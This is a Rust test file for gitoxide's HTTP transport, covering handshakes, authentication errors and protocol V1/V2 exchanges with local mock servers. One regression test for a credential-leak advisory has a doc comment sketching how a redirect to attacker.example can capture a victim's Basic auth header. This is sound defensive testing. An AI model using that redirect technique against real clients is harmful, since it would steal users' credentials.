use std::{
    cell::RefCell,
    collections::HashSet,
    error::Error,
    io::{self, BufRead, Read, Write},
    ops::Deref,
    rc::Rc,
    vec::IntoIter,
};

use bstr::ByteSlice;
use gix_transport::{
    client::{
        self,
        blocking_io::{http, SetServiceResponse, Transport, TransportV2Ext},
        TransportWithoutIO,
    },
    Protocol, Service,
};

use crate::fixture_bytes;

mod mock;

#[cfg(feature = "http-client-curl")]
type Remote = http::curl::Curl;
#[cfg(all(feature = "http-client-reqwest", not(feature = "http-client-curl")))]
type Remote = http::reqwest::Remote;

fn assert_error_status(
    status: usize,
    kind: std::io::ErrorKind,
) -> Result<(mock::Server, http::Transport<Remote>), crate::Error> {
    let (server, mut client) =
        mock::serve_and_connect(&format!("http-{status}.response"), "path/not-important", Protocol::V1)?;
    let error = client
        .handshake(Service::UploadPack, &[])
        .err()
        .expect("non-200 status causes error");
    let error = error
        .source()
        .unwrap_or_else(|| panic!("no source() in: {error:?} "))
        .downcast_ref::<std::io::Error>()
        .expect("io error as source");
    assert_eq!(error.kind(), kind);
    let expected = format!("Received HTTP status {status}");
    assert_eq!(error.to_string().get(..expected.len()), Some(expected).as_deref());
    drop(server.received());
    Ok((server, client))
}

#[test]
fn http_status_500_is_communicated_via_special_io_error() -> crate::Result {
    assert_error_status(500, std::io::ErrorKind::ConnectionAborted)?;
    Ok(())
}

#[test]
fn http_identity_is_picked_up_from_url() -> crate::Result {
    let transport = gix_transport::client::blocking_io::http::connect::<Remote>(
        "https://user:pass@example.com/repo".try_into()?,
        Protocol::V2,
        false,
    );
    assert_eq!(transport.to_url().as_ref(), "https://user:pass@example.com/repo");
    assert_eq!(
        transport.identity(),
        Some(&gix_sec::identity::Account {
            username: "user".into(),
            password: "pass".into(),
            oauth_refresh_token: None,
        })
    );
    Ok(())
}

// based on a test in cargo
#[test]
fn http_will_use_pipelining() {
    let server = std::net::TcpListener::bind("127.0.0.1:0").unwrap();
    let addr = server.local_addr().unwrap();

    fn headers(rdr: &mut dyn BufRead) -> HashSet<String> {
        let valid = ["GET", "Authorization", "Accept"];
        rdr.lines()
            .map(Result::unwrap)
            .take_while(|s| s.len() > 2)
            .map(|s| s.trim().to_string())
            .filter(|s| valid.iter().any(|prefix| s.starts_with(*prefix)))
            .collect()
    }

    let thread = std::thread::spawn({
        move || {
            let mut conn = std::io::BufReader::new(server.accept().unwrap().0);
            let req = headers(&mut conn);
            conn.get_mut()
                .write_all(
                    b"HTTP/1.1 401 Unauthorized\r\n\
              WWW-Authenticate: Basic realm=\"wheee\"\r\n\
              Content-Length: 0\r\n\
              Connection: close\r\n\
              \r\n",
                )
                .unwrap();
            conn.get_mut().flush().unwrap();
            conn.get_mut().shutdown(std::net::Shutdown::Both).ok();
            assert_eq!(
                req,
                vec![
                    "GET /reponame/info/refs?service=git-upload-pack HTTP/1.1",
                    "Accept: */*"
                ]
                .into_iter()
                .map(ToString::to_string)
                .collect()
            );

            let mut conn = std::io::BufReader::new(server.accept().unwrap().0);
            let req = headers(&mut conn);
            conn.get_mut()
                .write_all(
                    b"HTTP/1.1 401 Unauthorized\r\n\
              WWW-Authenticate: Basic realm=\"testenv\"\r\n\
              Content-Length: 0\r\n\
              Connection: close\r\n\
              \r\n",
                )
                .unwrap();
            conn.get_mut().flush().unwrap();
            conn.get_mut().shutdown(std::net::Shutdown::Both).ok();
            assert_eq!(
                req,
                vec![
                    "GET /reponame/info/refs?service=git-upload-pack HTTP/1.1",
                    "Authorization: Basic Zm9vOmJhcg==",
                    "Accept: */*",
                ]
                .into_iter()
                .map(ToString::to_string)
                .collect()
            );
        }
    });

    let url = format!("http://{}:{}/reponame", &addr.ip().to_string(), &addr.port());
    let mut client = gix_transport::client::blocking_io::http::connect::<Remote>(
        url.try_into().expect("valid url"),
        gix_transport::Protocol::V2,
        false,
    );
    match client.handshake(gix_transport::Service::UploadPack, &[]) {
        Ok(_) => unreachable!("expecting permission denied to be detected"),
        Err(gix_transport::client::Error::Io(err)) if err.kind() == std::io::ErrorKind::PermissionDenied => {}
        Err(err) => unreachable!("{err:?}"),
    }
    client
        .set_identity(gix_sec::identity::Account {
            username: "foo".into(),
            password: "bar".into(),
            oauth_refresh_token: None,
        })
        .unwrap();
    match client.handshake(gix_transport::Service::UploadPack, &[]) {
        Ok(_) => unreachable!("expecting permission denied to be detected"),
        Err(gix_transport::client::Error::Io(err)) if err.kind() == std::io::ErrorKind::PermissionDenied => {}
        Err(err) => unreachable!("{err:?}"),
    }
    thread.join().unwrap();
}

#[test]
fn http_authentication_error_can_be_differentiated_and_identity_is_transmitted() -> crate::Result {
    let (server, mut client) = assert_error_status(401, std::io::ErrorKind::PermissionDenied)?;
    server.next_read_and_respond_with(fixture_bytes("v1/http-handshake.response"));
    client.set_identity(gix_sec::identity::Account {
        username: "user".into(),
        password: "password".into(),
        oauth_refresh_token: None,
    })?;
    client.handshake(Service::UploadPack, &[])?;

    assert_eq!(
        server
            .received_as_string()
            .lines()
            .map(str::to_lowercase)
            .filter(ignore_reqwest_content_length)
            .collect::<HashSet<_>>(),
        format!(
            "GET /path/not-important/info/refs?service=git-upload-pack HTTP/1.1
Host: 127.0.0.1:{}
Accept: */*
User-Agent: git/oxide-{}
Authorization: Basic dXNlcjpwYXNzd29yZA==

",
            server.addr.port(),
            env!("CARGO_PKG_VERSION")
        )
        .lines()
        .map(str::to_lowercase)
        .collect::<HashSet<_>>()
    );

    server.next_read_and_respond_with(fixture_bytes("v1/http-handshake.response"));
    client.request(client::WriteMode::Binary, client::MessageKind::Flush, false)?;

    assert_eq!(
        {
            let mut m = server
                .received_as_string()
                .lines()
                .map(str::to_lowercase)
                .filter(|l| !l.starts_with("expect: "))
                .filter(ignore_reqwest_content_length)
                .collect::<HashSet<_>>();
            // On linux on CI, for some reason, it won't have this chunk id here, but
            // it has it whenever and where-ever I run it.
            m.remove("0");
            m
        },
        format!(
            "POST /path/not-important/git-upload-pack HTTP/1.1
Host: 127.0.0.1:{}
Transfer-Encoding: chunked
User-Agent: git/oxide-{}
Content-Type: application/x-git-upload-pack-request
Accept: application/x-git-upload-pack-result
Authorization: Basic dXNlcjpwYXNzd29yZA==

",
            server.addr.port(),
            env!("CARGO_PKG_VERSION")
        )
        .lines()
        .map(str::to_lowercase)
        .collect::<HashSet<_>>(),
        "the authentication information is used in subsequent calls"
    );

    Ok(())
}

/// Reproducer for GHSA-9857-6mw7-fq2m: after an initial cross-host redirect, neither the
/// redirected handshake nor any follow-up POST may forward `Authorization` derived from the
/// original URL or configured identity to the redirected host, regardless of HTTP backend.
///
/// A minimal sketch of the vulnerable flow is:
///
/// ```text
/// [victim -> origin]
///   GET /repo/info/refs?service=git-upload-pack HTTP/1.1
///   Host: origin.example
///   Authorization: Basic <victim-credentials>
///
/// [origin -> victim]
///   HTTP/1.1 302 Found
///   Location: http://attacker.example/repo/info/refs?service=git-upload-pack
///
/// [victim -> attacker] redirected handshake GET
///   GET /repo/info/refs?service=git-upload-pack HTTP/1.1
///   Host: attacker.example
///   Accept: */*
///   User-Agent: git/oxide-0.55.0
///   Authorization: <must be absent>
///
/// [attacker -> victim]
///   HTTP/1.1 200 OK
///   Content-Type: application/x-git-upload-pack-advertisement
///
/// [victim -> attacker] follow-up POST
///   POST /repo/git-upload-pack HTTP/1.1
///   Host: attacker.example
///   Authorization: <must be absent>
///
/// Before the fix, the redirected POST still carried the original Basic credentials, e.g.
/// `Authorization: Basic dmljdGltLXVzZXI6c3VwZXItc2VjcmV0LXRva2Vu`, leaking them to the attacker.
/// ```
#[test]
fn redirected_post_does_not_forward_basic_auth_to_the_new_host() -> crate::Result {
    fn response_with_connection_close(response: &[u8]) -> Vec<u8> {
        let split = response
            .windows(2)
            .position(|window| window == b"\n\n")
            .expect("response fixture with header/body separator");
        let (headers, body) = response.split_at(split);
        let body = &body[2..];
        let headers = std::str::from_utf8(headers).expect("fixture headers are UTF-8");

        let mut out = Vec::with_capacity(response.len() + 64);
        for line in headers.lines() {
            out.extend_from_slice(line.as_bytes());
            out.extend_from_slice(b"\r\n");
        }
        out.extend_from_slice(b"Connection: close\r\n\r\n");
        out.extend_from_slice(body);
        out
    }

    fn read_request_lines(reader: &mut dyn BufRead) -> Vec<String> {
        reader
            .lines()
            .map(Result::unwrap)
            .take_while(|line| !line.is_empty() && line != "\r")
            .map(|line| line.trim().to_string())
            .collect()
    }

    fn has_authorization(lines: &[String]) -> bool {
        lines
            .iter()
            .any(|line| line.to_ascii_lowercase().starts_with("authorization: basic "))
    }

    fn accept_request(
        listener: &std::net::TcpListener,
        timeout: std::time::Duration,
    ) -> Option<std::io::BufReader<std::net::TcpStream>> {
        let deadline = std::time::Instant::now() + timeout;
        listener
            .set_nonblocking(true)
            .expect("nonblocking listener can be configured");
        loop {
            match listener.accept() {
                Ok((stream, _)) => return Some(std::io::BufReader::new(stream)),
                Err(err) if err.kind() == std::io::ErrorKind::WouldBlock => {
                    if std::time::Instant::now() >= deadline {
                        return None;
                    }
                    std::thread::sleep(std::time::Duration::from_millis(10));
                }
                Err(err) => panic!("accept should work: {err}"),
            }
        }
    }

    let redirected_listener = std::net::TcpListener::bind("127.0.0.1:0")?;
    let redirected_addr = redirected_listener.local_addr()?;
    let redirect_listener = std::net::TcpListener::bind("127.0.0.1:0")?;
    let redirect_addr = redirect_listener.local_addr()?;

    let redirected = std::thread::spawn(move || -> (Vec<String>, Vec<String>) {
        let mut get = Vec::new();
        let mut post = Vec::new();

        if let Some(mut reader) = accept_request(&redirected_listener, std::time::Duration::from_secs(1)) {
            get = read_request_lines(&mut reader);
            reader
                .get_mut()
                .write_all(&response_with_connection_close(&fixture_bytes(
                    "v1/http-handshake.response",
                )))
                .expect("write handshake response");
            reader.get_mut().shutdown(std::net::Shutdown::Both).ok();
        }

        if let Some(mut reader) = accept_request(&redirected_listener, std::time::Duration::from_millis(250)) {
            post = read_request_lines(&mut reader);
            reader
                .get_mut()
                .write_all(
                    b"HTTP/1.1 200 OK\r\nContent-Type: application/x-git-upload-pack-result\r\nContent-Length: 4\r\nConnection: close\r\n\r\n0000",
                )
                .expect("write POST response");
            reader.get_mut().shutdown(std::net::Shutdown::Both).ok();
        }
        (get, post)
    });

    let redirect = std::thread::spawn(move || -> Vec<String> {
        let (stream, _) = redirect_listener.accept().expect("accept redirecting GET");
        let mut reader = std::io::BufReader::new(stream);
        let request = read_request_lines(&mut reader);
        reader
            .get_mut()
            .write_all(
                format!(
                    "HTTP/1.1 302 Found\r\nLocation: http://127.0.0.1:{}/repo/info/refs?service=git-upload-pack\r\nContent-Length: 0\r\nConnection: close\r\n\r\n",
                    redirected_addr.port()
                )
                .as_bytes(),
            )
            .expect("write redirect response");
        reader.get_mut().shutdown(std::net::Shutdown::Both).ok();
        request
    });

    let mut client = gix_transport::client::blocking_io::http::connect::<Remote>(
        format!("http://127.0.0.1:{}/repo", redirect_addr.port()).try_into()?,
        Protocol::V1,
        false,
    );
    client.set_identity(gix_sec::identity::Account {
        username: "user".into(),
        password: "password".into(),
        oauth_refresh_token: None,
    })?;

    let handshake_result = client.handshake(Service::UploadPack, &[]).map(|_| ());
    let request_result: Result<(), client::Error> = match handshake_result {
        Ok(()) => match client.request(client::WriteMode::Binary, client::MessageKind::Flush, false) {
            Ok(mut request) => match request.write_all(b"0000") {
                Ok(()) => request.into_read().map(|_| ()).map_err(client::Error::from),
                Err(err) => Err(client::Error::from(err)),
            },
            Err(err) => Err(err),
        },
        Err(err) => Err(err),
    };

    let original_get = redirect.join().expect("thread");
    let (redirected_get, redirected_post) = redirected.join().expect("thread");
    assert!(
        has_authorization(&original_get),
        "the original host still receives the configured credentials"
    );
    assert!(
        !has_authorization(&redirected_get),
        "the redirected GET should not leak credentials to the new host"
    );
    assert!(
        !has_authorization(&redirected_post),
        "the redirected POST must not forward credentials to the new host, got {redirected_post:?} with transport result {request_result:?}"
    );
    assert!(
        !redirected_get.is_empty() || !redirected_post.is_empty() || request_result.is_err(),
        "either a redirected request must be observed, or the backend must reject the redirect explicitly"
    );
    Ok(())
}

#[test]
fn http_error_results_in_observable_error() -> crate::Result {
    assert_error_status(404, std::io::ErrorKind::Other)?;
    Ok(())
}

#[test]
fn handshake_v1() -> crate::Result {
    let (server, mut c) = mock::serve_and_connect(
        "v1/http-handshake.response",
        "path/not/important/due/to/mock",
        Protocol::V1,
    )?;
    assert!(
        !c.connection_persists_across_multiple_requests(),
        "http connections are never stateful"
    );
    let SetServiceResponse {
        actual_protocol,
        capabilities,
        refs,
    } = c.handshake(Service::UploadPack, &[])?;
    assert_eq!(actual_protocol, Protocol::V1);
    assert_eq!(
        capabilities
            .iter()
            .map(|c| (c.name().to_owned(), c.value().map(ToOwned::to_owned)))
            .collect::<Vec<_>>(),
        [
            ("multi_ack", None),
            ("thin-pack", None),
            ("side-band", None),
            ("side-band-64k", None),
            ("ofs-delta", None),
            ("shallow", None),
            ("deepen-since", None),
            ("deepen-not", None),
            ("deepen-relative", None),
            ("no-progress", None),
            ("include-tag", None),
            ("multi_ack_detailed", None),
            ("allow-tip-sha1-in-want", None),
            ("allow-reachable-sha1-in-want", None),
            ("no-done", None),
            ("symref", Some("HEAD:refs/heads/main")),
            ("filter", None),
            ("agent", Some("git/github-gdf51a71f0236"))
        ]
        .iter()
        .map(|(n, v)| (
            n.as_bytes().as_bstr().to_owned(),
            v.map(|v| v.as_bytes().as_bstr().to_owned())
        ))
        .collect::<Vec<_>>()
    );
    let refs = refs
        .expect("v1 protocol provides refs")
        .lines()
        .map_while(Result::ok)
        .collect::<Vec<_>>();
    assert_eq!(
        refs,
        vec![
            "73a6868963993a3328e7d8fe94e5a6ac5078a944 HEAD",
            "73a6868963993a3328e7d8fe94e5a6ac5078a944 refs/heads/main",
            "8e472f9ccc7d745927426cbb2d9d077de545aa4e refs/pull/13/head",
            "1a33becbfa6aaf7661824ce40016acb8c179f13c refs/pull/14/head",
            "add2e3e8d155571154c8816cf57f473a6e4d8d31 refs/pull/2/head",
            "dce0ea858eef7ff61ad345cc5cdac62203fb3c10 refs/tags/gix-commitgraph-v0.0.0",
            "21c9b7500cb144b3169a6537961ec2b9e865be81 refs/tags/gix-commitgraph-v0.0.0^{}",
            "7ba6656568da186d153d66f26990b9b364ea9609 refs/tags/gix-features-v0.1.0",
            "5688a3427ff3673e1422d43106f4d685fa837aed refs/tags/gix-features-v0.1.0^{}",
            "92945a59059bf044744639673f1a0f5b314762ee refs/tags/gix-features-v0.2.0",
            "0bb831480d8657e1bb29ee7009aeac673471403e refs/tags/gix-features-v0.2.0^{}",
            "97e1d77270a8f9cbff19baf3803de8b4f5a339bf refs/tags/gix-features-v0.3.0",
            "4351e2871c9dcf342b8471fffa74cae338a53269 refs/tags/gix-features-v0.3.0^{}",
            "d5f78373a75de13ef3c08eedf03e616b2ec395f2 refs/tags/gix-features-v0.4.0",
            "9d6b8790e2edd7fa01b3239adff86a7cd2393f10 refs/tags/gix-features-v0.4.0^{}",
            "be64896ed543437b67e939c36ecd70945e100d6c refs/tags/gix-object-v0.1.0",
            "5688a3427ff3673e1422d43106f4d685fa837aed refs/tags/gix-object-v0.1.0^{}",
            "7b34dc75ac5010741c0675d8c3a9645adb9b2ee1 refs/tags/gix-object-v0.3.0",
            "e8df6c1ffb7afa27aff9abbe11c7e4b80d19b61e refs/tags/gix-object-v0.3.0^{}",
            "2249ae57005b7c5ff94409bbe0e3213cbfd1745f refs/tags/gix-odb-v0.1.0",
            "2b80181ad428a9bf267a9660886f347a850fc76f refs/tags/gix-odb-v0.1.0^{}",
            "a9bb4d08a8c159d2444615ce9f9bc68f40fe98b1 refs/tags/gix-odb-v0.3.0",
            "e8df6c1ffb7afa27aff9abbe11c7e4b80d19b61e refs/tags/gix-odb-v0.3.0^{}",
            "d5d9eabaa9f190e535771c8dcc9fd1bcf69b7947 refs/tags/gix-packetline-v0.1.0",
            "9d6b8790e2edd7fa01b3239adff86a7cd2393f10 refs/tags/gix-packetline-v0.1.0^{}",
            "defd2a7783ab4618f41c270477921aa2336693db refs/tags/gix-protocol-v0.0.0",
            "14615143dc170217ca4acc80191f4e6725dc460a refs/tags/gix-protocol-v0.0.0^{}",
            "7e168eef62b8ad6ddd49e4e50d500761b84cfb4f refs/tags/gix-ref-v0.1.0",
            "e66c9ed041c7ebede869e899ecd4398fee47028b refs/tags/gix-ref-v0.1.0^{}",
            "fde229329d5d4540d21a04dcaf8cfb13a1e8a8c5 refs/tags/gix-ref-v0.2.0",
            "d350a13784685ea82b84646b18736986aeb68146 refs/tags/gix-ref-v0.2.0^{}",
            "4f75945daf9e0a669b694b0652c5a7e8a6dd2246 refs/tags/gix-ref-v0.3.0",
            "e8df6c1ffb7afa27aff9abbe11c7e4b80d19b61e refs/tags/gix-ref-v0.3.0^{}",
            "058e7f3f554f37f05cc9aaf0c86b4bbe8bea9242 refs/tags/git-repository-v0.1.0",
            "2b80181ad428a9bf267a9660886f347a850fc76f refs/tags/git-repository-v0.1.0^{}",
            "74b85f2bc7a9bcdd59218ee54135d5dd3a8dbd72 refs/tags/git-repository-v0.3.0",
            "e8df6c1ffb7afa27aff9abbe11c7e4b80d19b61e refs/tags/git-repository-v0.3.0^{}",
            "40046d9f4ab51a8895e8de8a3ed4e213d87f042e refs/tags/gix-transport-v0.0.0",
            "19e7fec7deb5a6419f36a2732c90006377414181 refs/tags/gix-transport-v0.0.0^{}",
            "64bdbb4ef5415d4cfb088fbbdc8f5f6dca37aeca refs/tags/gix-tui-v0.0.0",
            "a0b73afdd1df9b1096f0c6fe388f795a6dfe7f33 refs/tags/gix-tui-v0.0.0^{}",
            "320c79b59068fc5f0fc11d331de7352bb1952f10 refs/tags/gix-url-v0.0.0",
            "fd2e5bab97f09666c983634fa89947a4bed1c92d refs/tags/gix-url-v0.0.0^{}",
            "58cbf2153987f6f4e91bd58074a1dd648f30f932 refs/tags/gitoxide-core-v0.1.0",
            "19e7fec7deb5a6419f36a2732c90006377414181 refs/tags/gitoxide-core-v0.1.0^{}",
            "640ce76991e36035af707ec4f9afc550cc33cb58 refs/tags/gitoxide-core-v0.3.0",
            "e8df6c1ffb7afa27aff9abbe11c7e4b80d19b61e refs/tags/gitoxide-core-v0.3.0^{}",
            "df1d23e4e6c489a74ab6c6845de49e54fe5a8f4d refs/tags/v0.1.0",
            "19e7fec7deb5a6419f36a2732c90006377414181 refs/tags/v0.1.0^{}",
            "7443892cb6b7925d98687903ab6d7ee0bdd1e9cf refs/tags/v0.3.0",
            "e8df6c1ffb7afa27aff9abbe11c7e4b80d19b61e refs/tags/v0.3.0^{}"
        ]
    );

    assert_eq!(
        server
            .received_as_string()
            .lines()
            .map(str::to_lowercase)
            .filter(ignore_reqwest_content_length)
            .collect::<HashSet<_>>(),
        format!(
            "GET /path/not/important/due/to/mock/info/refs?service=git-upload-pack HTTP/1.1
Host: 127.0.0.1:{}
Accept: */*
User-Agent: git/oxide-{}

",
            server.addr.port(),
            env!("CARGO_PKG_VERSION")
        )
        .lines()
        .map(str::to_lowercase)
        .collect::<HashSet<_>>()
    );
    Ok(())
}

#[test]
fn clone_v1() -> crate::Result {
    let (server, mut c) = mock::serve_and_connect(
        "v1/http-handshake.response",
        "path/not/important/due/to/mock",
        Protocol::V1,
    )?;
    let SetServiceResponse { refs, .. } =
        c.handshake(Service::UploadPack, &[("key", Some("value")), ("value-only", None)])?;
    io::copy(&mut refs.expect("refs in protocol V1"), &mut io::sink())?;
    assert_eq!(
        server
            .received_as_string()
            .lines()
            .map(str::to_lowercase)
            .find(|l| l.starts_with("git-protocol"))
            .expect("git-protocol header"),
        "git-protocol: key=value:value-only",
        "it writes extra-parameters without the version"
    );

    server.next_read_and_respond_with(fixture_bytes("v1/http-clone.response"));
    let mut writer = c.request(
        client::WriteMode::OneLfTerminatedLinePerWriteCall,
        client::MessageKind::Text(b"done"),
        false,
    )?;
    writer.write_all(b"hello")?;
    writer.write_all(b"world")?;

    let mut reader = writer.into_read()?;
    let mut line = String::new();
    reader.read_line(&mut line)?;
    assert_eq!(line, "NAK\n", "we receive a NAK in text mode before the PACK is sent");

    let messages = Rc::new(RefCell::new(Vec::<String>::new()));
    reader.set_progress_handler(Some(Box::new({
        let sb = messages.clone();
        move |is_err, data| {
            assert!(!is_err);
            sb.deref()
                .borrow_mut()
                .push(std::str::from_utf8(data).expect("valid utf8").to_owned());
            std::ops::ControlFlow::Continue(())
        }
    })));
    let mut pack = Vec::new();
    reader.read_to_end(&mut pack)?;
    assert_eq!(pack.len(), 876, "we receive the whole pack…");
    drop(reader);

    let sidebands = Rc::try_unwrap(messages).expect("no other handle").into_inner();
    assert_eq!(sidebands.len(), 3);
    assert_eq!(
        server
            .received_as_string()
            .lines()
            .map(str::to_lowercase)
            .filter(|l| !l.starts_with("expect: "))
            .collect::<HashSet<_>>(),
        format!(
            "POST /path/not/important/due/to/mock/git-upload-pack HTTP/1.1
Host: 127.0.0.1:{}
User-Agent: git/oxide-{}
Content-Type: application/x-git-upload-pack-request
Content-Length: 29
Accept: application/x-git-upload-pack-result

000ahello
000aworld
0009done",
            server.addr.port(),
            env!("CARGO_PKG_VERSION")
        )
        .lines()
        .map(str::to_lowercase)
        .collect::<HashSet<_>>()
    );
    Ok(())
}

#[test]
fn handshake_and_lsrefs_and_fetch_v2() -> crate::Result {
    handshake_and_lsrefs_and_fetch_v2_impl("v2/http-handshake.response")
}

#[test]
fn handshake_and_lsrefs_and_fetch_v2_googlesource() -> crate::Result {
    let (_server, mut c) = mock::serve_and_connect(
        "v2/http-no-newlines-handshake.response",
        "path/not/important/due/to/mock",
        Protocol::V2,
    )?;
    assert!(
        !c.connection_persists_across_multiple_requests(),
        "http connections are never stateful"
    );
    let SetServiceResponse {
        actual_protocol,
        capabilities,
        refs,
    } = c.handshake(Service::UploadPack, &[("value-only", None), ("key", Some("value"))])?;
    assert_eq!(actual_protocol, Protocol::V2);
    assert!(
        refs.is_none(),
        "refs are only returned in V1, as V2 favors a separate command (with more options)"
    );
    assert_eq!(
        capabilities
            .iter()
            .map(|v| {
                (
                    v.name().to_owned(),
                    v.values().map(|v| v.map(ToOwned::to_owned).collect::<Vec<_>>()),
                )
            })
            .collect::<Vec<_>>(),
        [
            ("ls-refs", None),
            (
                "fetch",
                Some(
                    &[
                        "filter",
                        "ref-in-want",
                        "sideband-all",
                        "packfile-uris",
                        "wait-for-done",
                        "shallow"
                    ][..]
                )
            ),
            ("server-option", None),
            ("session-id", None),
        ]
        .iter()
        .map(|(k, v)| (
            k.as_bytes().into(),
            v.map(|v| v.iter().map(|v| v.as_bytes().into()).collect::<Vec<_>>())
        ))
        .collect::<Vec<_>>()
    );
    Ok(())
}

#[test]
fn handshake_and_lsrefs_and_fetch_v2_service_announced() -> crate::Result {
    handshake_and_lsrefs_and_fetch_v2_impl("v2/http-handshake-service-announced.response")
}

fn handshake_and_lsrefs_and_fetch_v2_impl(handshake_fixture: &str) -> crate::Result {
    let (server, mut c) = mock::serve_and_connect(handshake_fixture, "path/not/important/due/to/mock", Protocol::V2)?;
    assert!(
        !c.connection_persists_across_multiple_requests(),
        "http connections are never stateful"
    );
    let SetServiceResponse {
        actual_protocol,
        capabilities,
        refs,
    } = c.handshake(Service::UploadPack, &[("value-only", None), ("key", Some("value"))])?;
    assert_eq!(actual_protocol, Protocol::V2);
    assert!(
        refs.is_none(),
        "refs are only returned in V1, as V2 favors a separate command (with more options)"
    );
    assert_eq!(
        capabilities
            .iter()
            .map(|v| {
                (
                    v.name().to_owned(),
                    v.values().map(|v| v.map(ToOwned::to_owned).collect::<Vec<_>>()),
                )
            })
            .collect::<Vec<_>>(),
        [
            ("agent", Some(&["git/github-gdf51a71f0236"][..])),
            ("ls-refs", None),
            ("fetch", Some(&["shallow", "filter"])),
            ("server-option", None)
        ]
        .iter()
        .map(|(k, v)| (
            k.as_bytes().into(),
            v.map(|v| v.iter().map(|v| v.as_bytes().into()).collect::<Vec<_>>())
        ))
        .collect::<Vec<_>>()
    );

    assert_eq!(
        server
            .received_as_string()
            .lines()
            .map(str::to_lowercase)
            .filter(ignore_reqwest_content_length)
            .collect::<HashSet<_>>(),
        format!(
            "GET /path/not/important/due/to/mock/info/refs?service=git-upload-pack HTTP/1.1
Host: 127.0.0.1:{}
Accept: */*
User-Agent: git/oxide-{}
Git-Protocol: version=2:value-only:key=value

",
            server.addr.port(),
            env!("CARGO_PKG_VERSION")
        )
        .lines()
        .map(str::to_lowercase)
        .collect::<HashSet<_>>()
    );

    server.next_read_and_respond_with(fixture_bytes("v2/http-lsrefs.response"));
    drop(refs);
    let res = c.invoke(
        "ls-refs",
        [("without-value", None), ("with-value", Some("value"))].iter().copied(),
        Some(vec!["arg1".as_bytes().as_bstr().to_owned()].into_iter()),
        false,
    )?;
    assert_eq!(
        res.lines().collect::<Result<Vec<_>, _>>()?,
        vec![
            "808e50d724f604f69ab93c6da2919c014667bedb HEAD symref-target:refs/heads/master",
            "808e50d724f604f69ab93c6da2919c014667bedb refs/heads/master"
        ]
    );

    assert_eq!(
        server
            .received_as_string()
            .lines()
            .map(str::to_lowercase)
            .filter(|l| !l.starts_with("expect: "))
            .collect::<HashSet<_>>(),
        format!(
            "POST /path/not/important/due/to/mock/git-upload-pack HTTP/1.1
Host: 127.0.0.1:{}
User-Agent: git/oxide-{}
Content-Type: application/x-git-upload-pack-request
Content-Length: 76
Accept: application/x-git-upload-pack-result
Git-Protocol: version=2

0014command=ls-refs
0012without-value
0015with-value=value
00010009arg1
0000",
            server.addr.port(),
            env!("CARGO_PKG_VERSION")
        )
        .lines()
        .map(str::to_lowercase)
        .collect::<HashSet<_>>()
    );

    server.next_read_and_respond_with(fixture_bytes("v2/http-fetch.response"));
    let mut res = c.invoke(
        "fetch",
        Vec::<(_, Option<&str>)>::new().into_iter(),
        None::<IntoIter<bstr::BString>>,
        false,
    )?;
    let mut line = String::new();
    res.read_line(&mut line)?;
    assert_eq!(line, "packfile\n");

    let messages = Rc::new(RefCell::new(Vec::<String>::new()));
    res.set_progress_handler(Some(Box::new({
        let sb = messages.clone();
        move |is_err, data| {
            assert!(!is_err);
            sb.deref()
                .borrow_mut()
                .push(std::str::from_utf8(data).expect("valid utf8").to_owned());
            std::ops::ControlFlow::Continue(())
        }
    })));

    let mut pack = Vec::new();
    res.read_to_end(&mut pack)?;
    assert_eq!(pack.len(), 876);

    drop(res);
    let messages = Rc::try_unwrap(messages).expect("no other handle").into_inner();
    assert_eq!(messages.len(), 5);

    let actual = server.received_as_string();
    let expected = format!(
        "POST /path/not/important/due/to/mock/git-upload-pack HTTP/1.1
Host: 127.0.0.1:{}
User-Agent: git/oxide-{}
Content-Type: application/x-git-upload-pack-request
Accept: application/x-git-upload-pack-result
Git-Protocol: version=2
Content-Length: 22

0012command=fetch
0000",
        server.addr.port(),
        env!("CARGO_PKG_VERSION")
    );
    assert_eq!(
        actual
            .lines()
            .filter(|l| !l.starts_with("expect: "))
            .map(str::to_lowercase)
            .collect::<HashSet<_>>(),
        expected.lines().map(str::to_lowercase).collect::<HashSet<_>>()
    );
    Ok(())
}

#[test]
fn check_content_type_is_case_insensitive() -> crate::Result {
    let (_server, mut client) = mock::serve_and_connect(
        "v2/http-handshake-lowercase-headers.response",
        "path/not/important/due/to/mock",
        Protocol::V2,
    )?;
    let result = client.handshake(Service::UploadPack, &[]);
    assert!(result.is_ok());
    Ok(())
}

fn ignore_reqwest_content_length(header_line: &String) -> bool {
    header_line != "content-length: 0"
}
